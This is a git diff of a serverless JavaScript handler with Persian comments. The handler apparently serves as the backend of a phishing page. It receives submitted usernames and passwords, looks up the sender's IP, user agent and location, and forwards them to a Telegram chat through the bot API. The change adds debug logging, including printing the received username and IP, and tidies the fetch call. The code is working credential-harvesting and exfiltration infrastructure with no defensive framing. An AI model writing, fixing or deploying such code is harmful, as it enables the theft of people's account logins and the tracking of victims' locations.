@@ -1,5 +1,5 @@
 export default async function handler(req, res) {
-    // CORS headers
+    // CORS headers - برای جلوگیری از خطای CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -17,17 +17,21 @@ export default async function handler(req, res) {
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+    console.log('TELEGRAM_BOT_TOKEN exists:', !!TELEGRAM_BOT_TOKEN);
+    console.log('TELEGRAM_CHAT_ID exists:', !!TELEGRAM_CHAT_ID);
+    console.log('TELEGRAM_CHAT_ID value:', TELEGRAM_CHAT_ID);
+
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.error('Telegram credentials not set in environment variables');
-        return res.status(500).json({ 
-            status: 'error', 
-            message: 'Server configuration error - missing Telegram credentials' 
-        });
+        return res.status(500).json({ status: 'error', message: 'Server configuration error - missing Telegram credentials' });
     }
 
     // دریافت داده از body (JSON)
     const username = (req.body?.username || '').trim();
     const password = (req.body?.password || '').trim();
+
+    console.log('Received username:', username);
+    console.log('Password received:', password ? 'YES' : 'NO');
 
     if (!username || !password) {
         return res.status(400).json({ status: 'error', message: 'Empty fields' });
@@ -41,6 +45,8 @@ export default async function handler(req, res) {
         'Unknown';
 
     const userAgent = req.headers['user-agent'] || 'Unknown';
+
+    console.log('User IP:', ip);
 
     // موقعیت جغرافیایی از IP
     let location = 'Unknown';
@@ -84,39 +90,45 @@ export default async function handler(req, res) {
         '━━━━━━━━━━━━━━━━',
     ].join('\n');
 
+    console.log('Message prepared, sending to Telegram...');
+
     // ارسال به تلگرام
     try {
-        const telegramRes = await fetch(
-            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-            {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML',
-                    disable_web_page_preview: true,
-                }),
-            }
-        );
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        console.log('Telegram API URL (token hidden):', url.replace(TELEGRAM_BOT_TOKEN, 'HIDDEN'));
+
+        const telegramRes = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true,
+            }),
+        });
 
         const telegramData = await telegramRes.json();
+        console.log('Telegram response status:', telegramRes.status);
+        console.log('Telegram response body:', JSON.stringify(telegramData));
 
         if (!telegramData.ok) {
             console.error('Telegram API error:', telegramData);
+            // برگرداندن خطا به کاربر برای دیباگ
             return res.status(200).json({ 
                 status: 'error', 
-                message: 'Telegram error: ' + (telegramData.description || 'Unknown error')
+                message: 'Telegram error: ' + (telegramData.description || 'Unknown error') 
             });
         }
     } catch (tgErr) {
         console.error('Telegram send error:', tgErr.message);
         return res.status(200).json({ 
             status: 'error', 
-            message: 'Telegram connection error: ' + tgErr.message
+            message: 'Telegram connection error: ' + tgErr.message 
         });
     }
 
+    console.log('Message sent successfully!');
     return res.status(200).json({ status: 'ok' });
 }
 
